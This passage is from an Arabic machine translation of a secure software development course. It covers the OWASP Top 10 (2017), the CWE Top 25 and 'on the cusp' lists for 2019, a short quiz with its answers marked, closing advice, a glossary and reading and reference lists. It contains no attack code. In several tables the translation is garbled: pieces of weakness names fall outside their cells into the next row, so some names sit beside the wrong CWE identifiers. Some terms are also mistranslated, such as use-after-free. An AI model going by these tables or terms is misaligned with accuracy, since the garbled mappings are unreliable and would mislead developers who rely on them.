    <td><a href="https://cwe.mitre.org/data/definitions/863.html">CWE-863</a></td>
   <td> تفويض</td>
  </tr>
  <tr>
   <td>[39]</td>
    غير صحيح <td><a href="https://cwe.mitre.org/data/definitions/532.html">سي دبليو إي-532</a></td>
   <td> إدراج معلومات حساسة في ملفات</td>
  </tr>
  <tr>
   <td>[40]</td>
    السجل <td><a href="https://cwe.mitre.org/data/definitions/770.html">سي دبليو إي-770</a></td>
   <td> تخصيص الموارد دون حدود أو اختناق</td>
  </tr>
</table>

سيكون من دواعي سرورنا معرفة أن هذه المجموعة من الدورات قد ناقشت ، لفترة وجيزة على الأقل ، كل نوع من هذه الأنواع من نقاط الضعف ، حتى تلك "على أعتاب" ،
لكل من  نسختي [2019](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html) و [2021](https://cwe.mitre.org/top25/archive/2021/2021_cwe_top25.html) من قائمة CWE Top 25.


#### اختبار 4.6: CWE أعلى 25

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!x]  تم إنشاء قائمة CWE لأفضل 25 خطأ برمجيا خطيرا لعام 2021 باستخدام بيانات العالم الحقيقي حول الثغرات الأمنية جنبا إلى جنب مع درجات الخطورة

[x]  قائمة 2021 CWE لأهم 25 خطأ في البرامج هي مزيج من جميع أنواع البرامج.

[ ] لا تتداخل CWEs المدرجة في 2021 CWE Top 25 أخطر أخطاء البرامج مع بعضها البعض. {{ محدد: لا، هناك CWEs تتداخل. على سبيل المثال، CWE-119 ("تقييد غير صحيح للعمليات داخل حدود المخزن المؤقت للذاكرة") هي مجموعة شاملة لكل من CWE-125 ("قراءة خارج الحدود") و CWE-787 ("الكتابة خارج الحدود"). }}

## ملاحظات ختامية

### الاستنتاجات

الهدف من هذه الدورة هو مساعدتك في تطوير برامج آمنة. نأمل أن تشعر أنك أكثر استعدادا لمواجهة المهاجمين.

أثناء تطوير برنامجك:

* ضع في اعتبارك متطلباتها الأمنية. تأكد من أنك تعرف ما يفترض القيام به ... ولا *تفعل* .

* تصميم للأمان. ضع في اعتبارك باستمرار مبادئ التصميم ، مثل أقل امتياز وعدم قابلية التجاوز.

* التنفيذ من أجل الأمان. على وجه الخصوص ، مواجهة الأنواع الشائعة من الأخطاء. إن مجرد مواجهة الأنواع الشائعة من نقاط الضعف لا يكفي لإنشاء نظام آمن ، ولكنه خطوة كبيرة إلى الأمام. ستساعدك معرفة الأنواع الشائعة من أخطاء التنفيذ أيضا على إدراك أنواع أخرى من نقاط الضعف أيضا.

* تثبت. على وجه الخصوص ، استخدم أدوات لاكتشاف المشكلات *قبل* الشحن. حيثما أمكن، قم بتمكين الأدوات في أقرب وقت ممكن وتأكد من أنها في خط أنابيب التكامل المستمر (CI).

* الميدان والتعامل مع تقارير الضعف على الفور.

الأمن في الحياة الواقعية هو عملية - رحلة - وليس نقطة نهاية بسيطة. نأمل أن تكون هذه الدورة قد جعلتك أكثر استعدادا للقيام بهذه الرحلة. نتمنى لك الأفضل أثناء تطوير البرامج التي ستساعد في حماية سمعة الأشخاص وممتلكاتهم وحتى حياتهم.

# الجزء الثالث: الامتحان النهائي

* غير مدرج كجزء من الإصدار المجاني من الدورة التدريبية.

# الجزء الرابع: المواد الداعمة التي ليست جزءا من الدورة

# المسرد

المهاجم: الشخص الذي يهاجم أنظمة الكمبيوتر.

تقوية النظام: تعديل النظام بحيث تقل احتمالية أن تصبح العيوب ثغرات أمنية.

هاكر: "الشخص الذي يسعد بالحصول على فهم حميم للأعمال الداخلية للنظام ، وأجهزة الكمبيوتر وشبكات الكمبيوتر على وجه الخصوص." ([IETF RFC 1983](https://tools.ietf.org/html/rfc1983))

# قراءة متعمقة

(ليس جزءا من الدورة في حد ذاته)

يناقش العديد من الآخرين كيفية تطوير برامج آمنة. تغطي هذه الدورة فقط الأساسيات (كما نراها). فيما يلي بعض الموارد:

* "تصميم وبرمجة البرامج الآمنة: مواد الفصل" بقلم ديفيد أ. ويلر  - [https://dwheeler.com/secure-class/](https://dwheeler.com/secure-class/) - مواد محاضرة لفصل الدراسات العليا في جامعة جورج ميسون (GMU). هذه فئة دراسات عليا ، لذا فهي تدخل في مزيد من التفاصيل.

* "البرمجة الآمنة HOWTO" - كتاب ديفيد أ. ويلر - [https://dwheeler.com/secure-programs/](https://dwheeler.com/secure-programs/)

* "الممارسات الأساسية لتطوير البرمجيات الآمنة ، الإصدار الثالث" من SAFECode. نشرت SAFECode مواد مفيدة أخرى ، على سبيل المثال ، "إدارة المخاطر الأمنية الكامنة في استخدام مكونات الطرف الثالث" و "ممارسات التطوير الآمن للتطبيقات السحابية" - [https://safecode.org/publications/](https://safecode.org/publications/)

* برمجة آمنة مع تحليل ثابت بواسطة بريان تشيس وجاكوب ويست

* الدليل الرسمي (ISC)2 إلى CSSLP CBK ((ISC)2 Press) ، بول ، مانو

* التخفيف من مخاطر الثغرات الأمنية في البرامج من خلال اعتماد إطار عمل آمن لتطوير البرامج (SSDF) ، NIST ، [https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04232020.pdf](https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04232020.pdf)

* نموذج بناء الأمن في النضج (BSIMM) <[https://www.bsimm.com/](https://www.bsimm.com/)>

* إطار عمل BSA للبرامج الآمنة [https://www.bsa.org/files/reports/bsa_software_security_framework_web_final.pdf](https://www.bsa.org/files/reports/bsa_software_security_framework_web_final.pdf)

* ممارسات الترميز الآمن OWASP - دليل مرجعي سريع <https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/migrated_content>

* [أفضل ممارسات سلسلة توريد البرمجيات](https://github.com/cncf/tag-security/raw/main/supply-chain-security/supply-chain-security-paper/CNCF_SSCP_v1.pdf) من مؤسسة الحوسبة السحابية الأصلية (CNCF)

# التعيينات القديمة

## أعلى 10 OWASP و CWE أعلى 25

### OWASP Top 10 (إصدار 2017)

فيما يلي *أهم 10 مخاطر أمنية لتطبيقات الويب* OWASP (إصدار 2017) ؛ يرجى قراءة هذه القائمة للتأكد من فهمك لكل منها:

1. *"الحقن. تحدث عيوب الحقن، مثل SQL وNoSQL ونظام التشغيل وحقن LDAP، عند إرسال بيانات غير موثوق بها إلى مترجم فوري كجزء من أمر أو استعلام. يمكن للبيانات المعادية للمهاجم خداع المترجم لتنفيذ أوامر غير مقصودة أو الوصول إلى البيانات دون إذن مناسب.*

2. *المصادقة المعطلة. غالبا ما يتم تنفيذ وظائف التطبيق المتعلقة بالمصادقة وإدارة الجلسة بشكل غير صحيح ، مما يسمح للمهاجمين باختراق كلمات المرور أو المفاتيح أو الرموز المميزة للجلسة ، أو استغلال عيوب التنفيذ الأخرى لتحمل هويات المستخدمين الآخرين بشكل مؤقت أو دائم.*

3. *التعرض للبيانات الحساسة. لا تحمي العديد من تطبيقات الويب وواجهات برمجة التطبيقات البيانات الحساسة بشكل صحيح ، مثل البيانات المالية والرعاية الصحية ومعلومات تحديد الهوية الشخصية. يجوز للمهاجمين سرقة أو تعديل هذه البيانات ضعيفة الحماية لإجراء عمليات احتيال على بطاقات الائتمان أو سرقة الهوية أو جرائم أخرى.*  *قد يتم اختراق البيانات الحساسة دون حماية إضافية ، مثل التشفير أثناء الراحة أو أثناء النقل ، وتتطلب احتياطات خاصة عند تبادلها مع المتصفح.*

4. *كيانات XML الخارجية (XXE). تقوم العديد من معالجات XML القديمة أو التي تم تكوينها بشكل سيئ بتقييم مراجع الكيانات الخارجية داخل مستندات XML. يمكن استخدام الكيانات الخارجية للكشف عن الملفات الداخلية باستخدام معالج URI للملفات ومشاركات الملفات الداخلية وفحص المنافذ الداخلية وتنفيذ التعليمات البرمجية عن بعد وهجمات رفض الخدمة.*

5. *كسر التحكم في الوصول. غالبا ما لا يتم فرض القيود المفروضة على ما يسمح للمستخدمين المصادق عليهم بالقيام به بشكل صحيح. يمكن للمهاجمين استغلال هذه العيوب للوصول إلى وظائف و / أو بيانات غير مصرح بها ، مثل الوصول إلى حسابات المستخدمين الآخرين ، وعرض الملفات الحساسة ، وتعديل بيانات المستخدمين الآخرين ، وتغيير حقوق الوصول ، وما إلى ذلك.*

6. *التكوين الخاطئ للأمان. التكوين الخاطئ للأمان هو المشكلة الأكثر شيوعا. عادة ما يكون هذا نتيجة للتكوينات الافتراضية غير الآمنة ، والتكوينات غير المكتملة أو المخصصة ، والتخزين السحابي المفتوح ، ورؤوس HTTP التي تم تكوينها بشكل خاطئ ، ورسائل الخطأ المطولة التي تحتوي على معلومات حساسة. لا يجب فقط تكوين جميع أنظمة التشغيل والأطر والمكتبات والتطبيقات بشكل آمن ، ولكن يجب تصحيحها / ترقيتها في الوقت المناسب.*

7. *البرمجة النصية عبر المواقع XSS. تحدث عيوب XSS عندما يتضمن أحد التطبيقات بيانات غير موثوق بها في صفحة ويب جديدة دون التحقق من الصحة أو الهروب بشكل صحيح ، أو يقوم بتحديث صفحة ويب موجودة ببيانات يوفرها المستخدم باستخدام واجهة برمجة تطبيقات المستعرض التي يمكنها إنشاء HTML أو JavaScript. يسمح XSS للمهاجمين بتنفيذ البرامج النصية في متصفح الضحية والتي يمكن أن تختطف جلسات المستخدم أو تشوه مواقع الويب أو تعيد توجيه المستخدم إلى مواقع ضارة.*

8. *إلغاء التسلسل غير الآمن. غالبا ما يؤدي إلغاء التسلسل غير الآمن إلى تنفيذ التعليمات البرمجية عن بعد. حتى إذا لم تؤد عيوب إلغاء التسلسل إلى تنفيذ التعليمات البرمجية عن بعد، فيمكن استخدامها لتنفيذ الهجمات، بما في ذلك هجمات إعادة التشغيل وهجمات الحقن وهجمات تصعيد الامتيازات.*

9. *استخدام مكونات ذات ثغرات أمنية معروفة. تعمل المكونات، مثل المكتبات والأطر والوحدات النمطية للبرامج الأخرى، بنفس امتيازات التطبيق. إذا تم استغلال مكون ضعيف ، يمكن أن يسهل مثل هذا الهجوم فقدان البيانات بشكل خطير أو الاستيلاء على الخادم. قد تؤدي التطبيقات وواجهات برمجة التطبيقات التي تستخدم مكونات ذات ثغرات أمنية معروفة إلى تقويض دفاعات التطبيق وتمكين الهجمات والتأثيرات المختلفة.*

10. *عدم كفاية التسجيل والمراقبة. يسمح التسجيل والمراقبة غير الكافيين ، إلى جانب التكامل المفقود أو غير الفعال مع الاستجابة للحوادث ، للمهاجمين بمزيد من أنظمة الهجوم ، والحفاظ على المثابرة ، والتحول إلى المزيد من الأنظمة ، والعبث بالبيانات أو استخراجها أو إتلافها. تظهر معظم دراسات الخرق أن الوقت اللازم للكشف عن الخرق يزيد عن 200 يوم ، وعادة ما يتم اكتشافه من قبل أطراف خارجية بدلا من العمليات الداخلية أو المراقبة.*

### CWE Top 25 (إصدار 2019)

إليك إصدار 2019 من CWE [لأخطر 25 خطأ في البرامج](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html). تم إنشاء هذه القائمة باستخدام بيانات العالم الحقيقي ، وتحديدا ، نقاط الضعف المعروفة للجمهور مع نقاط الضعف والتعرض الشائعة (CVE) كما هو منشور في قاعدة بيانات الثغرات الوطنية (NVD) التابعة للمعهد الوطني للمعايير والتكنولوجيا (NIST) ، بما في ذلك درجات الخطورة كما تم حسابها باستخدام درجات نظام تسجيل نقاط الضعف المشترك (CVSS). تجمع هذه القائمة بين العديد من أنواع البرامج المختلفة. ما إذا كان هذا جيدا أم لا يعتمد على وجهة نظرك.

لا يوجد نظام مثالي. ومن المضاعفات أن CWEs المحددة هنا هي على مستويات هرمية مختلفة. على سبيل المثال  ، # 1 CWE-119 ([تقييد غير صحيح للعمليات داخل حدود المخزن المؤقت للذاكرة](https://cwe.mitre.org/data/definitions/119.html)) هو مجموعة شاملة من كل من # 5 * CWE-125 (قراءة خارج الحدود) و # * [12 ](https://cwe.mitre.org/data/definitions/125.html)CWE-787* (*[](https://cwe.mitre.org/data/definitions/787.html)كتابة خارج الحدود**) ، ومع ذلك فهي مدرجة جميعا هنا. ومع ذلك ، فإن هذا يوفر نهجا يمكن الدفاع عنه وتكراره لتحديد ما هو مهم.

#### أعلى 25 (2019)

<table>
  <tr>
    <td>رتبة</td>
     <td>معرف</td>
    <td> اسم</td>
  </tr>
  <tr>
    <td>[1]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/119.html">سي دبليو إي-119</a></td>
    <td> تقييد غير صحيح للعمليات داخل حدود المخزن المؤقت</td>
  </tr>
  <tr>
    <td>[2]</td>
     للذاكرة <td><a href="https://cwe.mitre.org/data/definitions/79.html">سي دبليو إي-79</a></td>
    <td> تحييد غير صحيح للإدخال أثناء إنشاء صفحة الويب ("البرمجة النصية عبر المواقع")</td>
  </tr>
  <tr>
    <td>[3]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/20.html">سي دبليو إي-20</a></td>
     التحقق من صحة<td>
    </td>
  </tr>
  <tr>
    <td>[4]</td> الإدخال بشكل غير صحيح<td><a href="https://cwe.mitre.org/data/definitions/200.html"> سي دبليو إي-200</a></td>
    <td> التعرض للمعلومات</td>
  </tr>
  <tr>
    <td>[5]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/125.html">سي دبليو إي-125</a></td>
    <td> قراءة</td>
  </tr>
  <tr>
    <td>[6]</td>
     خارج الحدود <td><a href="https://cwe.mitre.org/data/definitions/89.html">سي دبليو إي-89</a></td>
    <td> تحييد غير صحيح للعناصر الخاصة المستخدمة في أمر SQL ("حقن SQL")</td>
  </tr>
  <tr>
    <td>[7]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/416.html">سي دبليو إي-416</a></td>
     <td>استخدم بعد مجانا</td>
  </tr>
  <tr>
    <td>[8]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/190.html">سي دبليو إي-190</a></td>
    <td> تجاوز عدد صحيح أو التفاف</td>
  </tr>
  <tr>
    <td>[9]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/352.html">سي دبليو إي-352</a></td>
    <td> تزوير الطلبات عبر المواقع (CSRF)</td>
  </tr>
  <tr>
    <td>[10]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/22.html">سي دبليو إي-22</a></td>
    <td> تقييد غير صحيح لاسم المسار إلى دليل مقيد ("مسار تنقل")</td>
  </tr>
  <tr>
    <td>[11]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/78.html">سي دبليو إي-78</a></td>
    <td> التحييد غير الصحيح للعناصر الخاصة المستخدمة في أمر نظام التشغيل ("حقن أمر نظام التشغيل")</td>
  </tr>
  <tr>
    <td>[12]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/787.html">سي دبليو إي-787</a></td>
    <td> الكتابة</td>
  </tr>
  <tr>
    <td>[13]</td>
     خارج الحدود <td><a href="https://cwe.mitre.org/data/definitions/287.html">سي دبليو إي-287</a></td>
    <td> المصادقة</td>
  </tr>
  <tr>
    <td>[14]</td>
     غير الصحيحة <td><a href="https://cwe.mitre.org/data/definitions/476.html">سي دبليو إي-476</a></td>
     مرجع<td>
    </td>
  </tr>
  <tr>
    <td>[15]</td> مؤشر NULL <td><a href="https://cwe.mitre.org/data/definitions/732.html">سي دبليو إي-732</a></td>
    <td> تعيين إذن غير صحيح للمورد</td>
  </tr>
  <tr>
    <td>[16]</td>
     الحرج <td><a href="https://cwe.mitre.org/data/definitions/434.html">سي دبليو إي-434</a></td>
    <td> تحميل غير مقيد للملف من النوع</td>
  </tr>
  <tr>
    <td>[17]</td>
     الخطير <td><a href="https://cwe.mitre.org/data/definitions/611.html">سي دبليو إي-611</a></td>
    <td> تقييد غير صحيح لمرجع</td>
  </tr>
  <tr>
    <td>[18]</td>
     كيان خارجي XML <td><a href="https://cwe.mitre.org/data/definitions/94.html">سي دبليو إي-94</a></td>
     <td>التحكم غير السليم في إنشاء التعليمات البرمجية ("حقن الكود")</td>
  </tr>
  <tr>
    <td>[19]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/798.html">سي دبليو إي-798</a></td>
    <td> استخدام بيانات الاعتماد</td>
  </tr>
  <tr>
    <td>[20]</td>
     المشفرة <td><a href="https://cwe.mitre.org/data/definitions/400.html">سي دبليو إي-400</a></td>
     استهلاك<td>
    </td>
  </tr>
  <tr>
    <td>[21]</td> الموارد غير المنضبط<td><a href="https://cwe.mitre.org/data/definitions/772.html"> سي دبليو إي-772</a></td>
    <td> إصدار مفقود من المورد بعد عمر فعال (!)</td>
  </tr>
  <tr>
    <td>[22]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/426.html">سي دبليو إي-426</a></td>
     <td>مسار بحث غير موثوق به (!)</td>
  </tr>
  <tr>
    <td>[23]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/502.html">سي دبليو إي-502</a></td>
    <td> إلغاء تسلسل البيانات</td>
  </tr>
  <tr>
    <td>[24]</td>
     غير الموثوق بها <td><a href="https://cwe.mitre.org/data/definitions/269.html">سي دبليو إي-269</a></td>
     إدارة<td>
    </td>
  </tr>
  <tr>
    <td>[25]</td> الامتيازات غير الصحيحة<td><a href="https://cwe.mitre.org/data/definitions/295.html"> سي دبليو إي-295</a></td>
     <td>التحقق من صحة الشهادة بشكل غير صحيح</td>
  </tr>
</table>

تلك التي تحمل علامة (!) موجودة في إصدار 2019 ولكن ليس إصدار 2021.


#### على أعتاب (2019)

شعر مطورو CWE Top 25 أن هناك عددا من نقاط الضعف التي كانت مهمة ، لكنهم لم يتمكنوا من أن يكونوا في أعلى 25 لأنهم لم يكونوا منتشرين أو يميلون إلى أن يكونوا أقل حدة. يسمون نقاط الضعف هذه *على أعتاب*.

قد يرغب المطورون الذين يكملون اتخاذ قرارات التخفيف والمخاطر في 2019 CWE Top 25 في البحث عن نقاط الضعف الأخرى المحتملة في برامجهم. لهذه الأسباب ، يجب على مستخدمي 2019 CWE Top 25 التفكير بجدية في تضمين نقاط الضعف الإضافية هذه في تحليلاتهم:

<table>
  <tr>
    <td>رتبة</td>
     <td>معرف</td>
    <td> اسم</td>
  </tr>
  <tr>
    <td>[26]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/835.html">سي دبليو إي-835</a></td>
    <td> حلقة مع حالة خروج لا يمكن الوصول إليها ("حلقة لا نهائية") (!)</td>
  </tr>
  <tr>
    <td>[27]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/522.html">سي دبليو إي-522</a></td>
     بيانات الاعتماد<td>
  </td>
    </tr>
  <tr>
    <td>[28]</td> غير المحمية بشكل كاف<td><a href="https://cwe.mitre.org/data/definitions/704.html"> CWE-704</a></td>
    <td> تحويل نوع غير صحيح أو يلقي (!)</td>
  </tr>
  <tr>
    <td>[29]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/362.html">سي دبليو إي-362</a></td>
    <td> التنفيذ المتزامن باستخدام مورد مشترك مع مزامنة غير صحيحة ("حالة السباق")</td>
  </tr>
  <tr>
    <td>[30]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918</a></td>
     <td>تزوير الطلبات من جانب الخادم (SSRF)</td>
  </tr>
  <tr>
    <td>[31]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/415.html">سي دبليو إي-415</a></td>
     <td>مزدوجة مجانية (!)</td>
  </tr>
  <tr>
    <td>[32]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601</a></td>
     <td>إعادة توجيه عنوان URL إلى موقع غير موثوق به ("إعادة توجيه مفتوحة")</td>
  </tr>
  <tr>
    <td>[33]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/863.html">CWE-863</a></td>
    <td> تفويض</td>
  </tr>
  <tr>
    <td>[34]</td>
     غير صحيح <td><a href="https://cwe.mitre.org/data/definitions/862.html">سي دبليو إي-862</a></td>
    <td> التفويض</td>
  </tr>
  <tr>
    <td>[35]</td>
     مفقود <td><a href="https://cwe.mitre.org/data/definitions/532.html">سي دبليو إي-532</a></td>
    <td> إدراج معلومات حساسة في ملفات</td>
  </tr>
  <tr>
    <td>[36]</td>
     السجل <td><a href="https://cwe.mitre.org/data/definitions/306.html">سي دبليو إي-306</a></td>
    <td> مصادقة مفقودة للوظيفة</td>
  </tr>
  <tr>
    <td>[37]</td>
     الحرجة <td><a href="https://cwe.mitre.org/data/definitions/384.html">سي دبليو إي-384</a></td>
    <td> تثبيت الجلسة (!)</td>
  </tr>
  <tr>
    <td>[38]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/326.html">سي دبليو إي-326</a></td>
    <td> قوة تشفير غير كافية (!)</td>
  </tr>
  <tr>
    <td>[39]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/770.html">سي دبليو إي-770</a></td>
    <td> تخصيص الموارد دون حدود أو اختناق</td>
  </tr>
  <tr>
    <td>[40]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/617.html">CWE-617</a></td>
     <td>تأكيد يمكن الوصول إليه (!)</td>
  </tr>
</table>

تلك التي تحمل علامة (!) موجودة في إصدار 2019 ولكن ليس إصدار 2021.

# مراجع

(ليس جزءا من الدورة في حد ذاته)

ألف واحد (إلياس ليفي) ، *تحطيم المكدس من أجل المتعة والربح ، *Phrack # 49 ، 1996 ([http://phrack.org/issues/49/14.html#article](http://phrack.org/issues/49/14.html#article))

أموديو ، دان أموديو ، "الكود عن بعد مع حقن لغة التعبير" ، 2012-12-14. (<http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/>)

أندرسون ، جيمس ب. * ، دراسة تخطيط تكنولوجيا أمن الكمبيوتر* ، المجلد الأول ، ESD-TR-73-51 (المجلدان الأول والثاني) ، أكتوبر 1972[ (https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72a.pdf](https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72a.pdf)) و ([https://csrc.nist.rip/publications/history/ande72.pdf](https://csrc.nist.rip/publications/history/ande72.pdf))

أندرسون ، جيمس ب. * ، دراسة تخطيط تكنولوجيا أمن الكمبيوتر ، *المجلد الثاني ، 1972 ([https://apps.dtic.mil/dtic/tr/fulltext/u2/772806.pdf](https://apps.dtic.mil/dtic/tr/fulltext/u2/772806.pdf))

أندرسون ، روس ، *هندسة الأمن: دليل لبناء أنظمة موزعة يمكن الاعتماد عليها* ([https://www.cl.cam.ac.uk/~rja14/book.html](https://www.cl.cam.ac.uk/~rja14/book.html))

باكوس ، جي دبليو ، آر جي بيبر ، إس بيست ، آر جولدبرج ، إتش إل هيريك ، آر إيه هيوز ، إل بي ميتشل ، آر إيه نيلسون ، آر نوت ، دي ساير ، بي بي شيريدان ، إتش ستيرن ، آي زيلر. * نظام الترميز التلقائي FORTRAN ل IBM 704 EDPM: الدليل المرجعي للمبرمج* ، قسم العلوم التطبيقية وقسم أبحاث البرمجة ، شركة آلات الأعمال الدولية ، 1956-10-15 ([https://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf](https://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf))

Bals ، فريد * ، حساء الأبجدية AppSec: دليل ل SAST و IAST و DAST و RASP ، *مدونة Synopsys "سلامة البرامج" ، 2018-08-14 ([https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/](https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/))

باركر ، إيلين * ، توصية لإدارة المفاتيح: الجزء 1 - عام ، *منشور NIST الخاص 800-57 الجزء 1 المراجعة 5 ، 2020 ، ([https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf))

بيرسان ، أليكس ، 2021-02-09 ، "ارتباك التبعية: كيف اخترقت Apple و Microsoft وعشرات الشركات الأخرى" ، (<https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610>)

جداول بوبي ، "جافا" ، (<https://bobby-tables.com/java>)

بلاك ، بول إي ؛ بادجر ، لي. جوتمان ، باربرا ؛ فونغ ، إليزابيث * ، الحد بشكل كبير من نقاط الضعف في البرامج: تقرير إلى مكتب البيت الأبيض لسياسة العلوم والتكنولوجيا ، *NISTIR 8151 ، مختبر تكنولوجيا المعلومات التابع للمعهد الوطني الأمريكي للمعايير والتكنولوجيا (NIST) ، 2016-11 ([https://nvlpubs.nist.gov/nistpubs/ir/2016/NIST.IR.8151.pdf](https://nvlpubs.nist.gov/nistpubs/ir/2016/NIST.IR.8151.pdf))

Breeden II ، John * ، 9 أفضل أدوات التشويش: العثور على أغرب أخطاء التطبيق *، 2019 ([https://www.csoonline.com/article/3487708/9-top-fuzzing-tools-finding-the-weirdest-application-errors.html](https://www.csoonline.com/article/3487708/9-top-fuzzing-tools-finding-the-weirdest-application-errors.html))

Bressers, Josh*, شدة نقاط الضعف المكسورة*, 2020-05-25 ([https://opensourcesecurity.io/2020/05/27/broken-vulnerability-severities/](https://opensourcesecurity.io/2020/05/27/broken-vulnerability-severities/))

بتلر ، ريكي دبليو ، *ما هي الطرق الرسمية؟ * ([https://shemesh.larc.nasa.gov/fm/fm-what.html](https://shemesh.larc.nasa.gov/fm/fm-what.html))

قائمة الأسئلة الشائعة C ([http://c-faq.com/ansi/undef.html](http://c-faq.com/ansi/undef.html))

كارليني ، نيكولاس ، وديفيد واجنر ، 2017 ،
"لا يمكن اكتشاف الأمثلة العدائية بسهولة: تجاوز عشر طرق كشف"

كارليني ، نيكولاس أنيش أثلي ، نيكولاس بابيرنوت ، وآخرون ، "حول تقييم متانة الخصومة" ، 2019-02-20 ، <https://arxiv.org/pdf/1902.06705>.

جامعة كارنيجي ميلون: معهد هندسة البرمجيات ، قسم CERT ([https://sei.cmu.edu/about/divisions/cert/index.cfm](https://sei.cmu.edu/about/divisions/cert/index.cfm))

تشين ، ريموند  ، *يمكن أن يؤدي السلوك غير المحدد إلى السفر عبر الزمن (من بين أمور أخرى ، ولكن السفر عبر الزمن هو الأكثر مرحا*) ، 2014-06-27 ، ([https://devblogs.microsoft.com/oldnewthing/20140627-00/?p=633](https://devblogs.microsoft.com/oldnewthing/20140627-00/?p=633))

Cimpanu ، Catalin  ، *Microsoft: 70 بالمائة من جميع الأخطاء الأمنية هي مشكلات آمنة للذاكرة* ، 2019-02-11 ([https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/](https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/))

Cimpanu ، كاتالين ، "تم القبض على مكتبتين خبيثتين من Python تسرقان مفاتيح SSH و GPG" ، ZDNet ، 2019-12-03 ، <https://www.zdnet.com/article/two-malicious-python-libraries-removed-from-pypi>

CISCO، *الجيل التالي من التشفير* ([https://tools.cisco.com/security/center/resources/next_generation_cryptography](https://tools.cisco.com/security/center/resources/next_generation_cryptography))

كوجيشال ، جون * ، تحديث بروتوكول Git ل SHA-256 *، 2020 ([https://lwn.net/Articles/823352/](https://lwn.net/Articles/823352/))

اللجنة الوطنية للمعلوماتية والحريات  (CNIL) ، *أدلة CNIL: أمن البيانات الشخصية *، 2018 ([https://www.cnil.fr/sites/default/files/atoms/files/cnil_guide_securite_personnelle_gb_web.pdf](https://www.cnil.fr/sites/default/files/atoms/files/cnil_guide_securite_personnelle_gb_web.pdf))

اللجنة الوطنية للمعلوماتية والحريات (CNIL*) ، حلول للاستخدام المسؤول ل blockchain في سياق البيانات الشخصية *، 2018 ([https://www.cnil.fr/sites/default/files/atoms/files/blockchain_en.pdf](https://www.cnil.fr/sites/default/files/atoms/files/blockchain_en.pdf))

المعايير المشتركة ، *المعايير المشتركة لتقييم أمن تكنولوجيا المعلومات (CC) الجزء 2 (*[https://www.commoncriteriaportal.org/](https://www.commoncriteriaportal.org/))

كوربيت ، جوناثان * ، خوارزمية تجزئة جديدة ل Git* ، 2020 ([https://lwn.net/Articles/811068/](https://lwn.net/Articles/811068/))

كوكس ، بن ، "تدقيق جودة مفتاح SSH لمستخدمي GitHub" ، 2015-06-02 (<https://blog.benjojo.co.uk/post/auditing-github-users-keys>)

وكالة الأمن السيبراني وأمن البنية التحتية (CISA) ، توجيه الطوارئ 21-01 ، ()<https://www.cisa.gov/emergency-directive-21-01>
وكالة الأمن السيبراني وأمن البنية التحتية (CISA) ، التنبيه AA20-352A ، ()<https://www.cisa.gov/uscert/ncas/alerts/aa20-352a>

ديشاند ، سيرجيج ، *ما هو FAST؟ *, 2020 ([https://blog.code-intelligence.com/what-is-fast](https://blog.code-intelligence.com/what-is-fast))

ديلايتر ، أوريلين. ستيفاليت ، برتراند. بلاك ، بول إي ؛ أوكون ، فاديم. ريبيرو ، آتوس. كوهين ، تيري س. * ، تقرير SATE V: عشر سنوات من معارض أدوات التحليل الثابتة* ، منشور NIST الخاص 500-326 ، 2018 ([https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.500-326.pdf](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.500-326.pdf)) أو ([https://doi.org/10.6028/NIST.SP.500-326](https://doi.org/10.6028/NIST.SP.500-326))

دي باولا وستيفانو وأرشان دابيرسياجي. "حقن لغة التعبير", 2011-09-12, (<https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf>)

دولين ، ماكسويل (ꓘ) ، العثور على تجاوز التفويض على موقع الويب الخاص بي ، 2022-03-03 ، ()<https://maxwelldulin.com/BlogPost?post=9185867776>

ECMA ، ECMA-262 ، الإصدار 12 ، يونيو 2021 ، مواصفات لغة ECMAScript® 2021 ، "نوع الرقم" ([https://www.ecma-international.org/ecma-262/11.0/index.html#sec-ecmascript-language-types-number-type]((https://www.ecma-international.org/ecma-262/11.0/index.html#sec-ecmascript-language-types-number-type))

